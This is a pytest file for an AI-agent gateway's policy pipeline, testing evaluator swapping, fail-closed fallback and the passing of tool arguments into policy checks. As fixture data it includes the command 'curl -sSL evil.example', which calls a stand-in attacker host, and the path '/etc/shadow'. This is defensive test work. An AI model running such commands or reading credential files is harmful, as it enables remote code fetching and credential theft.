"""End-to-end wiring tests for ``kya_gateway.policy_pipeline.evaluate()``
through the ``kya.PolicyEvaluator`` abstraction.

Three cohorts:

    1. Baseline — with the default ``NativeEvaluator``, every scenario
       in ``tests/test_gateway_policy.py`` still produces the same
       :class:`Verdict` shape it did pre-Phase-3. Regression check.

    2. Evaluator swap — registering a ``SabotageDenyEvaluator`` under
       a custom name + setting ``PolicyConfig.policy_evaluator_name``
       to that name flips ALL outcomes to deny, including inputs that
       would normally allow. Proves the wire-up is real end-to-end.

    3. Adapter — ``_verdict_result_to_gateway_verdict`` preserves the
       gateway's public :class:`Verdict` shape (``verdict``,
       ``reason_codes``, ``signal_kind``, ``rich``) so downstream
       consumers in ``kya_gateway/server.py`` stay unchanged.

Sabotage discipline (per feedback_sabotage_verify):
    * ``test_swap_sabotage_flips_rbac_deny_when_evaluator_returns_allow``
      registers a NoOpAllowEvaluator that returns allow for everything.
      An RBAC-deny scenario that ordinarily denies must now ALLOW.
    * ``test_swap_sabotage_flips_allow_to_deny_when_evaluator_returns_deny``
      registers a SabotageDenyEvaluator that returns deny for everything.
      An "empty policy" scenario that ordinarily allows must now DENY.
      Both directions prove the wire-up is real — a fake wire-up that
      only routed one direction would fail one of these tests.
"""
from __future__ import annotations

import pytest

from kya.policy_evaluator import (
    EvaluationInput,
    VerdictResult,
    register_evaluator,
    unregister_evaluator,
)
from kya_gateway.config import (
    BudgetConfig,
    PayloadCapsConfig,
    PolicyConfig,
    RateLimitConfig,
    RBACConfig,
    RBACRule,
)
from kya_gateway.identity import BoundPrincipal
from kya_gateway.policy_pipeline import (
    Verdict,
    _verdict_result_to_gateway_verdict,
    evaluate,
)


def _principal(kind: str = "agent") -> BoundPrincipal:
    return BoundPrincipal(
        principal_kind=kind,
        principal_id="planner",
        method="bearer_jwt",
        external_subject="planner",
        external_issuer=None,
    )


# ── Sabotage stubs ──────────────────────────────────────────────────


class SabotageDenyEvaluator:
    """Returns deny for every call. Registered under ``"sabotage-deny"``
    to prove ``PolicyConfig.policy_evaluator_name`` swap flows into
    ``evaluate()`` end-to-end. If ANY input still allows, the swap is
    not wired — that's the failure mode this stub detects."""

    name = "sabotage-deny"

    def evaluate(self, inp: EvaluationInput) -> VerdictResult:
        return VerdictResult(
            verdict="deny",
            reasons=("sabotage_forced_deny",),
            policy_hash="sabotage-hash",
            evaluator_name=self.name,
            signal_kind="governance_block",
        )


class NoOpAllowEvaluator:
    """Returns allow for every call. Used for the reverse-direction
    sabotage — an RBAC-deny scenario that ordinarily denies must NOT
    change under a NoOpAllow swap (because the evaluator's "allow"
    response is interpreted as "defer to the rule", per the dispatch
    helper contract). This test is the ANTI-sabotage: it asserts the
    fallback semantic is preserved, not overridden."""

    name = "noop-allow"

    def evaluate(self, inp: EvaluationInput) -> VerdictResult:
        return VerdictResult(
            verdict="allow",
            reasons=("noop_allow",),
            policy_hash="noop-hash",
            evaluator_name=self.name,
            signal_kind="clean_invocation",
        )


class OverrideToFlagEvaluator:
    """Returns flag_for_review for every call. Proves the evaluator
    can OVERRIDE a rule's deny with a warmer verdict — the LLM-judge
    layering scenario the Phase-3 abstraction was designed for."""

    name = "override-to-flag"

    def evaluate(self, inp: EvaluationInput) -> VerdictResult:
        return VerdictResult(
            verdict="flag_for_review",
            reasons=("override_to_flag",),
            evidence_payload={"gateway_rule": inp.attributes.get("gateway_rule")},
            policy_hash="override-hash",
            evaluator_name=self.name,
            signal_kind="governance_block",
        )


@pytest.fixture
def registry_scoped():
    """Register a fresh set of test evaluators and unregister them on
    teardown so cross-test pollution can't leak. Yields nothing — tests
    reference the evaluator names directly."""
    register_evaluator("sabotage-deny", SabotageDenyEvaluator())
    register_evaluator("noop-allow", NoOpAllowEvaluator())
    register_evaluator("override-to-flag", OverrideToFlagEvaluator())
    yield
    unregister_evaluator("sabotage-deny")
    unregister_evaluator("noop-allow")
    unregister_evaluator("override-to-flag")


# ── COHORT 1: Baseline regression — default NativeEvaluator ─────────
#
# Same assertions as the existing tests in test_gateway_policy.py, run
# again here so the Phase-3 wiring is REGRESSION-covered directly by
# this file (a review reader shouldn't have to cross-reference two
# files to prove Phase-3 preserved shape).


def test_baseline_empty_policy_allows_via_default_native():
    cfg = PolicyConfig(min_trust=0)
    v = evaluate(
        db=None, tenant_id="tenant-alpha", principal=_principal(),
        action="mcp.x.read", payload_bytes=100, invocation_id=None, cfg=cfg,
    )
    assert v.verdict == "allow"
    assert v.reason_codes == []


def test_baseline_rbac_deny_default_native():
    cfg = PolicyConfig(min_trust=0, rbac=RBACConfig(default="deny", rules=[]))
    v = evaluate(
        db=None, tenant_id="tenant-alpha", principal=_principal(),
        action="mcp.x.read", payload_bytes=100, invocation_id=None, cfg=cfg,
    )
    assert v.verdict == "deny"
    assert "RBAC_DENY" in v.reason_codes
    assert v.signal_kind == "rbac_refusal"


def test_baseline_payload_too_large_default_native():
    cfg = PolicyConfig(
        min_trust=0, payload_caps=PayloadCapsConfig(max_bytes=1024),
    )
    v = evaluate(
        db=None, tenant_id="tenant-alpha", principal=_principal(),
        action="mcp.x.read", payload_bytes=2048, invocation_id=None, cfg=cfg,
    )
    assert v.verdict == "deny"
    assert "PAYLOAD_TOO_LARGE" in v.reason_codes


def test_baseline_flag_for_review_default_native():
    cfg = PolicyConfig(
        min_trust=0,
        rbac=RBACConfig(default="deny", rules=[
            RBACRule(principal_kind="agent",
                     actions=["mcp.x.write"],
                     verdict="flag_for_review"),
        ]),
    )
    v = evaluate(
        db=None, tenant_id="tenant-alpha", principal=_principal(),
        action="mcp.x.write", payload_bytes=100, invocation_id=None, cfg=cfg,
    )
    assert v.verdict == "flag_for_review"
    assert "REQUIRES_HUMAN" in v.reason_codes


# ── COHORT 2: Swap sabotage — SabotageDenyEvaluator forces deny ─────


def test_swap_flips_allow_to_deny(registry_scoped):
    """Empty-policy scenario that ordinarily allows must DENY under
    the sabotage evaluator. This proves ``policy_evaluator_name``
    reaches the dispatch helper on the default-allow path."""
    cfg = PolicyConfig(min_trust=0, policy_evaluator_name="sabotage-deny")
    v = evaluate(
        db=None, tenant_id="tenant-alpha", principal=_principal(),
        action="mcp.x.read", payload_bytes=100, invocation_id=None, cfg=cfg,
    )
    assert v.verdict == "deny", (
        "SabotageDenyEvaluator returned deny but pipeline still allowed — "
        "the evaluator dispatch is not wired on the default-allow path"
    )
    assert v.reason_codes == ["sabotage_forced_deny"]
    assert v.rich.get("evaluator_name") == "sabotage-deny"
    assert v.rich.get("policy_hash") == "sabotage-hash"


def test_swap_flips_rbac_deny_signal_when_evaluator_overrides(registry_scoped):
    """When the gateway's RBAC rule wants to deny AND the sabotage
    evaluator also says deny, the evaluator's reason codes REPLACE
    the rule's — proving the evaluator response overrides, not
    merely augments. Also proves the evaluator dispatch fires on the
    RBAC deny path (one of the 11 emission sites)."""
    cfg = PolicyConfig(
        min_trust=0,
        rbac=RBACConfig(default="deny", rules=[]),
        policy_evaluator_name="sabotage-deny",
    )
    v = evaluate(
        db=None, tenant_id="tenant-alpha", principal=_principal(),
        action="mcp.x.read", payload_bytes=100, invocation_id=None, cfg=cfg,
    )
    assert v.verdict == "deny"
    # Evaluator's reasons win over the gateway's RBAC_DENY.
    assert v.reason_codes == ["sabotage_forced_deny"]


def test_swap_flips_payload_too_large_via_evaluator(registry_scoped):
    """PAYLOAD_TOO_LARGE is one of the deny emission sites. Sabotage
    the evaluator to prove this specific site routes through."""
    cfg = PolicyConfig(
        min_trust=0,
        payload_caps=PayloadCapsConfig(max_bytes=1024),
        policy_evaluator_name="sabotage-deny",
    )
    v = evaluate(
        db=None, tenant_id="tenant-alpha", principal=_principal(),
        action="mcp.x.read", payload_bytes=2048, invocation_id=None, cfg=cfg,
    )
    assert v.verdict == "deny"
    assert v.reason_codes == ["sabotage_forced_deny"]


def test_swap_override_flag_for_review(registry_scoped):
    """Prove the LLM-judge scenario: a rule wants deny, but the
    evaluator returns flag_for_review. The gateway must emit the
    evaluator's warmer verdict."""
    cfg = PolicyConfig(
        min_trust=0,
        rbac=RBACConfig(default="deny", rules=[]),  # would deny
        policy_evaluator_name="override-to-flag",
    )
    v = evaluate(
        db=None, tenant_id="tenant-alpha", principal=_principal(),
        action="mcp.x.read", payload_bytes=100, invocation_id=None, cfg=cfg,
    )
    assert v.verdict == "flag_for_review"
    assert v.reason_codes == ["override_to_flag"]
    # Evidence payload carries the gateway rule name that was
    # overridden — proves the EvaluationInput.attributes carries the
    # right context for a real Pro evaluator to make its decision.
    assert v.rich.get("gateway_rule") == "rbac"
    assert v.rich.get("evaluator_name") == "override-to-flag"


# ── COHORT 2b: NoOpAllow evaluator — fallback semantic ──────────────


def test_noop_allow_evaluator_defers_to_rule_verdicts(registry_scoped):
    """When the evaluator returns "allow", the pipeline DEFERS to the
    rule's inline candidate verdict. This is the backward-compat path
    for the default NativeEvaluator (whose default_allow branch fires
    for gateway-shaped inputs it doesn't recognise). Proves the
    fallback semantic is preserved even under an alternate evaluator
    with the same "allow" default."""
    cfg = PolicyConfig(
        min_trust=0,
        rbac=RBACConfig(default="deny", rules=[]),  # gateway rule wants deny
        policy_evaluator_name="noop-allow",
    )
    v = evaluate(
        db=None, tenant_id="tenant-alpha", principal=_principal(),
        action="mcp.x.read", payload_bytes=100, invocation_id=None, cfg=cfg,
    )
    # Evaluator returned allow → fallback to gateway's RBAC_DENY
    # (the "deny" wins, not the evaluator's "allow"). This is the
    # asymmetric semantic: the evaluator can OVERRIDE the rule with
    # a NON-allow verdict, but cannot force the pipeline to allow
    # something the rule wants to deny. That's fail-CLOSED by design.
    assert v.verdict == "deny"
    assert "RBAC_DENY" in v.reason_codes
    assert v.signal_kind == "rbac_refusal"


# ── COHORT 3: Adapter contract ──────────────────────────────────────


def test_adapter_preserves_all_fields():
    """The adapter must faithfully copy verdict / reasons / signal_kind
    from the evaluator's VerdictResult onto a gateway Verdict, and
    surface policy_hash + evaluator_name in `rich`."""
    fallback = Verdict(
        verdict="deny", reason_codes=["FALLBACK"], signal_kind="fallback-sk",
    )
    vr = VerdictResult(
        verdict="flag_for_review",
        reasons=("policy_x_matched", "policy_y_matched"),
        evidence_payload={"policy_x": {"weight": 42}, "policy_y": {"weight": 7}},
        policy_hash="sha256-abc123",
        evaluator_name="native",
        signal_kind="governance_block",
    )
    out = _verdict_result_to_gateway_verdict(vr, fallback=fallback)
    assert out.verdict == "flag_for_review"
    assert out.reason_codes == ["policy_x_matched", "policy_y_matched"]
    assert out.signal_kind == "governance_block"
    assert out.rich["policy_x"] == {"weight": 42}
    assert out.rich["policy_y"] == {"weight": 7}
    assert out.rich["policy_hash"] == "sha256-abc123"
    assert out.rich["evaluator_name"] == "native"


def test_adapter_falls_back_when_evaluator_omits_reasons():
    """If the evaluator returns an empty reasons tuple, the adapter
    falls back to the gateway rule's reason_codes so an audit
    breadcrumb is preserved. Sabotage stubs (which don't bother
    filling reasons) shouldn't erase the rule's diagnostic."""
    fallback = Verdict(
        verdict="deny", reason_codes=["RATE_LIMIT"], signal_kind="rate_sk",
    )
    vr = VerdictResult(
        verdict="deny",
        reasons=(),  # evaluator was terse
        policy_hash="h",
        evaluator_name="terse-eval",
    )
    out = _verdict_result_to_gateway_verdict(vr, fallback=fallback)
    assert out.verdict == "deny"
    # Fallback reasons preserved even when evaluator provided none.
    assert out.reason_codes == ["RATE_LIMIT"]
    # Signal_kind falls back too when evaluator omits it.
    assert out.signal_kind == "rate_sk"


def test_adapter_falls_back_signal_kind_when_evaluator_omits():
    fallback = Verdict(
        verdict="deny", reason_codes=["X"], signal_kind="fallback-sk",
    )
    vr = VerdictResult(
        verdict="deny", reasons=("y",), signal_kind=None, policy_hash="h",
    )
    out = _verdict_result_to_gateway_verdict(vr, fallback=fallback)
    assert out.signal_kind == "fallback-sk"


# ── COHORT 4: Registry miss / broken evaluator — fail-closed ────────


def test_missing_evaluator_falls_back_to_inline_rule_verdict():
    """A typo in ``policy_evaluator_name`` (or a custom evaluator not
    yet registered at boot) must not open a fail-open. Instead the
    pipeline uses the rule's inline candidate verdict — pre-Phase-3
    behaviour."""
    cfg = PolicyConfig(
        min_trust=0,
        rbac=RBACConfig(default="deny", rules=[]),
        policy_evaluator_name="nonexistent-evaluator-xyz",
    )
    v = evaluate(
        db=None, tenant_id="tenant-alpha", principal=_principal(),
        action="mcp.x.read", payload_bytes=100, invocation_id=None, cfg=cfg,
    )
    # Rule's inline candidate verdict fires — the missing evaluator
    # didn't turn a deny into an allow.
    assert v.verdict == "deny"
    assert "RBAC_DENY" in v.reason_codes


class BrokenEvaluator:
    """Raises on every call. Verifies the pipeline fails CLOSED via
    the rule's inline candidate verdict when the evaluator itself
    is broken."""

    name = "broken-evaluator"

    def evaluate(self, inp: EvaluationInput) -> VerdictResult:
        raise RuntimeError("evaluator boom")


def test_broken_evaluator_falls_back_to_inline_rule_verdict():
    register_evaluator("broken-evaluator", BrokenEvaluator())
    try:
        cfg = PolicyConfig(
            min_trust=0,
            rbac=RBACConfig(default="deny", rules=[]),
            policy_evaluator_name="broken-evaluator",
        )
        v = evaluate(
            db=None, tenant_id="tenant-alpha", principal=_principal(),
            action="mcp.x.read", payload_bytes=100, invocation_id=None, cfg=cfg,
        )
        # Evaluator raised → fallback to gateway rule's RBAC_DENY.
        # Never surfaces a fail-open.
        assert v.verdict == "deny"
        assert "RBAC_DENY" in v.reason_codes
    finally:
        unregister_evaluator("broken-evaluator")


# ── COHORT 5: Evaluator sees the right EvaluationInput shape ────────


class CaptureEvaluator:
    """Records the ``EvaluationInput`` it received on each call so
    tests can assert the pipeline builds the right attributes for
    downstream Pro evaluators to reason about."""

    name = "capture-eval"

    def __init__(self):
        self.calls: list[EvaluationInput] = []

    def evaluate(self, inp: EvaluationInput) -> VerdictResult:
        self.calls.append(inp)
        return VerdictResult(
            verdict="allow",
            reasons=("capture_allow",),
            policy_hash="capture-hash",
            evaluator_name=self.name,
        )


def test_evaluation_input_carries_gateway_rule_context():
    """A Pro evaluator layered on top of the gateway needs to know:
    which rule fired, what candidate verdict the rule wanted, and the
    request context (tenant, principal, action, payload_bytes,
    invocation_id). Assert all of those land on the EvaluationInput."""
    cap = CaptureEvaluator()
    register_evaluator("capture-eval", cap)
    try:
        cfg = PolicyConfig(
            min_trust=0,
            rbac=RBACConfig(default="deny", rules=[]),
            policy_evaluator_name="capture-eval",
        )
        evaluate(
            db=None, tenant_id="tenant-alpha",
            principal=_principal("agent"),
            action="mcp.filesystem.write",
            payload_bytes=512, invocation_id=99, cfg=cfg,
        )
        assert len(cap.calls) == 1, (
            f"expected exactly 1 evaluator call, got {len(cap.calls)}"
        )
        inp = cap.calls[0]
        assert inp.tenant_id == "tenant-alpha"
        assert inp.principal_kind == "agent"
        assert inp.principal_id == "planner"
        assert inp.action == "mcp.filesystem.write"
        # Gateway rule context lands in attributes.
        assert inp.attributes["gateway_rule"] == "rbac"
        assert inp.attributes["gateway_candidate_verdict"] == "deny"
        assert "RBAC_DENY" in inp.attributes["gateway_candidate_reason_codes"]
        assert inp.attributes["payload_bytes"] == 512
        assert inp.attributes["invocation_id"] == 99
    finally:
        unregister_evaluator("capture-eval")


# ── COHORT 6: tool_arguments threading ───────────────────────────────
#
# The gateway must forward the caller's tool arguments into the
# evaluator so a rule like ``when: {tool.input.command: {matches: curl}}``
# can actually inspect the command being invoked. Prior to this
# threading, evaluators saw an empty attribute bag and any
# tool.input.* rule silently no-op'd (green checkmark, zero
# enforcement). Sabotage-verify: drop the tool_arguments kwarg from
# _run_policy / _build_eval_input and these tests must fail.


def test_evaluate_threads_tool_arguments_to_evaluator():
    """When tool_arguments is passed to evaluate(), the evaluator's
    EvaluationInput.attributes dict must contain flattened
    ``tool.input.<key>`` entries with the raw values. This is the
    load-bearing plumbing test — a spy evaluator asserts on the real
    data flow rather than a return value."""
    cap = CaptureEvaluator()
    register_evaluator("capture-eval", cap)
    try:
        cfg = PolicyConfig(
            min_trust=0,
            rbac=RBACConfig(default="deny", rules=[]),
            policy_evaluator_name="capture-eval",
        )
        evaluate(
            db=None, tenant_id="tenant-alpha",
            principal=_principal("agent"),
            action="mcp.filesystem.write",
            payload_bytes=512, invocation_id=99, cfg=cfg,
            tool_arguments={
                "command": "curl -sSL evil.example",
                "timeout": 30,
                "flags": ["--silent", "-L"],
            },
        )
        assert len(cap.calls) == 1
        attrs = cap.calls[0].attributes
        # Each key flattens to tool.input.<key>. Raw types preserved:
        # str, int, list.
        assert attrs.get("tool.input.command") == "curl -sSL evil.example"
        assert attrs.get("tool.input.timeout") == 30
        assert attrs.get("tool.input.flags") == ["--silent", "-L"]
    finally:
        unregister_evaluator("capture-eval")


def test_evaluate_tool_arguments_none_skips_iteration():
    """FIX-4a — distinguish the None branch at policy_pipeline.py:304
    (``if tool_arguments:``). Explicit ``tool_arguments=None`` must
    skip the flatten loop entirely; NO ``tool.input.*`` keys land on
    the attrs bag. Weak-sabotage protection: the previous single test
    conflated None + {} + omitted-kwarg into one truthy check, so a
    regression that skipped ONLY None (or ONLY {}) would still pass.
    """
    cap = CaptureEvaluator()
    register_evaluator("capture-eval", cap)
    try:
        cfg = PolicyConfig(
            min_trust=0,
            rbac=RBACConfig(default="deny", rules=[]),
            policy_evaluator_name="capture-eval",
        )
        evaluate(
            db=None, tenant_id="tenant-alpha",
            principal=_principal("agent"),
            action="mcp.x.read",
            payload_bytes=100, invocation_id=1, cfg=cfg,
            tool_arguments=None,
        )
        assert len(cap.calls) == 1
        tool_input_keys = [
            k for k in cap.calls[0].attributes if k.startswith("tool.input.")
        ]
        assert tool_input_keys == [], (
            "tool_arguments=None must not synthesise any tool.input.* "
            f"keys, got {tool_input_keys}"
        )
    finally:
        unregister_evaluator("capture-eval")


def test_evaluate_tool_arguments_empty_dict_skips_iteration():
    """FIX-4b — distinguish the empty-dict branch. ``{}`` is falsy so
    the ``if tool_arguments:`` gate skips iteration. Separate test
    from the None case so a future refactor that swaps the truthy
    check for ``is not None`` (which would let ``{}`` fall through)
    is caught at CI time, not on next request.
    """
    cap = CaptureEvaluator()
    register_evaluator("capture-eval", cap)
    try:
        cfg = PolicyConfig(
            min_trust=0,
            rbac=RBACConfig(default="deny", rules=[]),
            policy_evaluator_name="capture-eval",
        )
        evaluate(
            db=None, tenant_id="tenant-alpha",
            principal=_principal("agent"),
            action="mcp.x.read",
            payload_bytes=100, invocation_id=1, cfg=cfg,
            tool_arguments={},
        )
        assert len(cap.calls) == 1
        tool_input_keys = [
            k for k in cap.calls[0].attributes if k.startswith("tool.input.")
        ]
        assert tool_input_keys == [], (
            "tool_arguments={} must not synthesise any tool.input.* "
            f"keys, got {tool_input_keys}"
        )
    finally:
        unregister_evaluator("capture-eval")


def test_evaluate_tool_arguments_populated_produces_flattened_keys():
    """FIX-4c — POSITIVE assertion the weak test never made: a
    non-empty dict DOES produce ``attrs["tool.input.k"] == "v"`` on
    the flattened attrs bag. Without this positive proof, both of
    the above absence-assertions could pass under a sabotage that
    silently DROPPED the flatten loop entirely.
    """
    cap = CaptureEvaluator()
    register_evaluator("capture-eval", cap)
    try:
        cfg = PolicyConfig(
            min_trust=0,
            rbac=RBACConfig(default="deny", rules=[]),
            policy_evaluator_name="capture-eval",
        )
        evaluate(
            db=None, tenant_id="tenant-alpha",
            principal=_principal("agent"),
            action="mcp.x.read",
            payload_bytes=100, invocation_id=1, cfg=cfg,
            tool_arguments={"k": "v"},
        )
        assert len(cap.calls) == 1
        assert cap.calls[0].attributes.get("tool.input.k") == "v", (
            "tool_arguments={'k':'v'} must produce "
            f"attrs['tool.input.k']=='v', got attributes="
            f"{dict(cap.calls[0].attributes)}"
        )
    finally:
        unregister_evaluator("capture-eval")


def test_evaluate_no_tool_input_entries_when_missing():
    """Original regression: when ``tool_arguments`` is entirely
    OMITTED from the call (default-arg path, distinct from explicit
    None), no ``tool.input.*`` keys appear. Retained alongside the
    three distinguishing tests above so the default-arg codepath
    stays covered independently.
    """
    cap = CaptureEvaluator()
    register_evaluator("capture-eval", cap)
    try:
        cfg = PolicyConfig(
            min_trust=0,
            rbac=RBACConfig(default="deny", rules=[]),
            policy_evaluator_name="capture-eval",
        )
        evaluate(
            db=None, tenant_id="tenant-alpha",
            principal=_principal("agent"),
            action="mcp.x.read",
            payload_bytes=100, invocation_id=1, cfg=cfg,
        )
        assert len(cap.calls) == 1
        tool_input_keys = [
            k for k in cap.calls[0].attributes if k.startswith("tool.input.")
        ]
        assert tool_input_keys == [], (
            f"expected no tool.input.* attrs, got {tool_input_keys}"
        )
    finally:
        unregister_evaluator("capture-eval")


def test_evaluate_tool_arguments_survive_when_extra_also_passed():
    """The dispatch closure ALSO passes ``extra`` kwargs from
    per-rule sites (e.g. ``budget_remaining``). Assert
    ``tool.input.*`` entries survive that merge — reusability of the
    existing ``attrs.update(extra)`` shouldn't clobber the tool input.
    """
    cap = CaptureEvaluator()
    register_evaluator("capture-eval", cap)
    try:
        # Payload cap forces a per-rule dispatch that passes
        # ``payload_bytes`` as an extra kwarg — exercises the
        # merge-with-extra codepath alongside tool_arguments.
        cfg = PolicyConfig(
            min_trust=0,
            payload_caps=PayloadCapsConfig(max_bytes=1024),
            policy_evaluator_name="capture-eval",
        )
        evaluate(
            db=None, tenant_id="tenant-alpha",
            principal=_principal("agent"),
            action="mcp.x.read",
            payload_bytes=2048, invocation_id=None, cfg=cfg,
            tool_arguments={"path": "/etc/shadow"},
        )
        assert len(cap.calls) == 1
        attrs = cap.calls[0].attributes
        assert attrs.get("tool.input.path") == "/etc/shadow"
        # Rule context still present.
        assert attrs.get("gateway_rule") == "payload_caps"
    finally:
        unregister_evaluator("capture-eval")
